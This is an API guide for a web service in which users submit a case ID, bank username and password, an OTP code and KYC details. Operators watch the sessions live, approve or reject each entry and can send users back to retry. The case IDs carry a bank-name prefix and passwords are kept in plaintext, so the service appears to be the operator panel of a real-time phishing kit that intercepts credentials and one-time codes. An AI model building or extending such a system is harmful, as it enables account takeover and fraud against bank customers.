📋 FRONTEND INTEGRATION GUIDE


1. BASE API URL
http://localhost:8000/api/
(Change localhost:8000 to your production domain)
2. AUTHENTICATION ENDPOINTS
Login (Get JWT Tokens)
POST /api/auth/login/
Content-Type: application/json

Request:
{
  "username": "agent_username",
  "password": "agent_password"
}

Response:
{
  "access": "eyJ0eXAiOiJKV1QiLCJhbGc...",
  "refresh": "eyJ0eXAiOiJKV1QiLCJhbGc..."
}
Refresh Token
POST /api/auth/refresh/
Content-Type: application/json

Request:
{
  "refresh": "eyJ0eXAiOiJKV1QiLCJhbGc..."
}

Response:
{
  "access": "eyJ0eXAiOiJKV1QiLCJhbGc..."
}
Verify Token
POST /api/auth/verify/
Content-Type: application/json

Request:
{
  "token": "eyJ0eXAiOiJKV1QiLCJhbGc..."
}

Response:
{} // Empty response = token is valid
3. SESSION MANAGEMENT ENDPOINTS (🎯 FIXES YOUR 404!)
List All Sessions
GET /api/sessions/

Headers:
Authorization: Bearer {access_token}

Query Parameters (optional):
  ?status=active          # Filter: active, completed, terminated
  ?stage=credentials      # Filter: case_id, credentials, secret_key, kyc, completed
  ?agent=1               # Filter by agent ID (staff only)

Response:
{
  "count": 5,
  "next": null,
  "previous": null,
  "results": [
    {
      "uuid": "550e8400-e29b-41d4-a716-446655440000",
      "external_case_id": "ABC123456",
      "agent": 1,
      "agent_username": "john_agent",
      "stage": "credentials",
      "status": "active",
      "user_online": true,
      "created_at": "2025-11-17T10:30:00Z",
      "updated_at": "2025-11-17T10:35:00Z"
    }
  ]
}
Create New Session
POST /api/sessions/

Headers:
Authorization: Bearer {access_token}
Content-Type: application/json

Request:
{
  "external_case_id": "ABC123456"  // Optional - auto-generated if not provided
}

Response:
{
  "uuid": "550e8400-e29b-41d4-a716-446655440000",
  "external_case_id": "ABC123456",
  "agent": 1,
  "agent_username": "john_agent",
  "stage": "case_id",
  "status": "active",
  "user_online": false,
  "notes": "",
  "user_data": {},
  "created_at": "2025-11-17T10:30:00Z",
  "updated_at": "2025-11-17T10:30:00Z"
}
Get Session Details
GET /api/sessions/{uuid}/

Headers:
Authorization: Bearer {access_token}

Response:
{
  "uuid": "550e8400-e29b-41d4-a716-446655440000",
  "external_case_id": "ABC123456",
  "agent": 1,
  "agent_username": "john_agent",
  "stage": "credentials",
  "status": "active",
  "user_online": true,
  "notes": "Customer seems legitimate",
  "user_data": {
    "current_submission": {
      "stage": "credentials",
      "data": {
        "username": "user@example.com",
        "password": "secret123"
      }
    },
    "verified_data": {
      "credentials": {
        "username": "user@example.com",
        "password": "secret123",
        "verified_at": "2025-11-17T10:35:00Z",
        "verified_by": "john_agent"
      }
    }
  },
  "created_at": "2025-11-17T10:30:00Z",
  "updated_at": "2025-11-17T10:35:00Z"
}
Update Session (Notes)
PATCH /api/sessions/{uuid}/

Headers:
Authorization: Bearer {access_token}
Content-Type: application/json

Request:
{
  "notes": "Customer verified, proceeding with credentials"
}

Response:
{
  "uuid": "550e8400-e29b-41d4-a716-446655440000",
  "notes": "Customer verified, proceeding with credentials",
  ...
}
End Session
POST /api/sessions/{uuid}/end/

Headers:
Authorization: Bearer {access_token}

Response:
{
  "status": "session_ended",
  "uuid": "550e8400-e29b-41d4-a716-446655440000",
  "case_id": "ABC123456"
}
Delete Session
DELETE /api/sessions/{uuid}/

Headers:
Authorization: Bearer {access_token}

Response:
(No body - HTTP 204 No Content)
4. USER FLOW ENDPOINTS (User-Facing - No Auth Required!)
Verify Case ID
POST /api/verify-case/

Request:
{
  "case_id": "ABC123456"
}

Response:
{
  "status": "verified",
  "next_step": "credentials",
  "uuid": "550e8400-e29b-41d4-a716-446655440000",
  "message": "Case ID verified. Please proceed to enter credentials."
}
Submit Credentials
POST /api/submit-credentials/

Request:
{
  "case_id": "ABC123456",
  "username": "user@example.com",
  "password": "secret123"
}

Response:
{
  "status": "ok",
  "message": "Credentials submitted. Waiting for verification."
}
Submit Secret Key (OTP)
POST /api/submit-secret-key/

Request:
{
  "case_id": "ABC123456",
  "secret_key": "123456"
}

Response:
{
  "status": "ok",
  "message": "Secret key submitted. Waiting for verification."
}
User Started KYC
POST /api/user-started-kyc/

Request:
{
  "case_id": "ABC123456"
}

Response:
{
  "status": "ok",
  "message": "KYC process started"
}
Submit KYC
POST /api/submit-kyc/

Request:
{
  "case_id": "ABC123456"
}

Response:
{
  "status": "ok",
  "message": "KYC submitted. Waiting for verification."
}
5. AGENT ACTION ENDPOINTS (Agent Only - Requires Auth)
Accept Login Credentials
POST /api/sessions/{uuid}/accept-login/

Headers:
Authorization: Bearer {access_token}

Response:
{
  "status": "login_accepted",
  "next_stage": "secret_key",
  "message": "User credentials verified. Moving to secret key stage."
}
Reject Login Credentials
POST /api/sessions/{uuid}/reject-login/

Headers:
Authorization: Bearer {access_token}
Content-Type: application/json

Request:
{
  "reason": "Invalid credentials"  // Optional
}

Response:
{
  "status": "login_rejected",
  "message": "User credentials rejected. They will be asked to retry."
}
Accept Secret Key (OTP)
POST /api/sessions/{uuid}/accept-otp/

Headers:
Authorization: Bearer {access_token}

Response:
{
  "status": "otp_accepted",
  "next_stage": "kyc",
  "message": "Secret key verified. Moving to KYC stage."
}
Reject Secret Key (OTP)
POST /api/sessions/{uuid}/reject-otp/

Headers:
Authorization: Bearer {access_token}
Content-Type: application/json

Request:
{
  "reason": "Invalid OTP"  // Optional
}

Response:
{
  "status": "otp_rejected",
  "message": "User secret key rejected. They will be asked to retry."
}
Accept KYC
POST /api/sessions/{uuid}/accept-kyc/

Headers:
Authorization: Bearer {access_token}

Response:
{
  "status": "kyc_accepted",
  "message": "KYC verified. Session completed successfully."
}
Reject KYC
POST /api/sessions/{uuid}/reject-kyc/

Headers:
Authorization: Bearer {access_token}
Content-Type: application/json

Request:
{
  "reason": "KYC verification failed"  // Optional
}

Response:
{
  "status": "kyc_rejected",
  "message": "User KYC rejected. They will be asked to retry."
}
6. GLOBAL CONTROL ENDPOINTS (Agent Only - Requires Auth)
Force Complete Session
POST /api/sessions/{uuid}/force-complete/

Headers:
Authorization: Bearer {access_token}
Content-Type: application/json

Request:
{
  "reason": "Customer verified elsewhere"  // Optional
}

Response:
{
  "status": "session_completed",
  "message": "Session force-completed successfully."
}
Reset Session
POST /api/sessions/{uuid}/reset/

Headers:
Authorization: Bearer {access_token}

Response:
{
  "status": "session_reset",
  "message": "Session reset to initial state successfully."
}
Navigate Back to Credentials
POST /api/sessions/{uuid}/back-to-credentials/

Headers:
Authorization: Bearer {access_token}

Response:
{
  "status": "navigated_back",
  "current_stage": "credentials",
  "message": "User navigated back to credentials stage."
}
Navigate Back to OTP
POST /api/sessions/{uuid}/back-to-otp/

Headers:
Authorization: Bearer {access_token}

Response:
{
  "status": "navigated_back",
  "current_stage": "secret_key",
  "message": "User navigated back to secret_key stage."
}
Restart KYC
POST /api/sessions/{uuid}/restart-kyc/

Headers:
Authorization: Bearer {access_token}

Response:
{
  "status": "kyc_restarted",
  "current_stage": "kyc",
  "message": "KYC process restarted."
}
7. UTILITY ENDPOINTS (Agent Only - Requires Auth)
Generate Case ID
POST /api/generate-case-id/

Headers:
Authorization: Bearer {access_token}

Response:
{
  "status": "success",
  "case_id": "CIBC12345678",
  "message": "Generated case ID: CIBC12345678"
}
8. SAVE NOTES (Custom Action)
Save Session Notes
POST /api/sessions/{uuid}/save_notes/

Headers:
Authorization: Bearer {access_token}
Content-Type: application/json

Request:
{
  "notes": "Customer seems legitimate, credentials look valid"
}

Response:
{
  "status": "notes_saved",
  "notes": "Customer seems legitimate, credentials look valid"
}
🔐 AUTHENTICATION NOTES
Token Storage: Store access and refresh tokens
Token Usage: Include in headers as Authorization: Bearer {access_token}
Token Expiry:
Access token: 60 minutes
Refresh token: 7 days
Refresh Flow: When access token expires, use refresh token to get new one
Cookie Support: Tokens are stored in HTTP-only cookies (CSRF safe)
📝 ERROR RESPONSE FORMAT
All endpoints return consistent error responses:
{
  "error": "Error description",
  "detail": "More detailed information",
  "status_code": 400
}
Common status codes:
200: Success
201: Created
204: No Content (deleted)
400: Bad Request
401: Unauthorized
403: Forbidden (permission denied)
404: Not Found
500: Server Error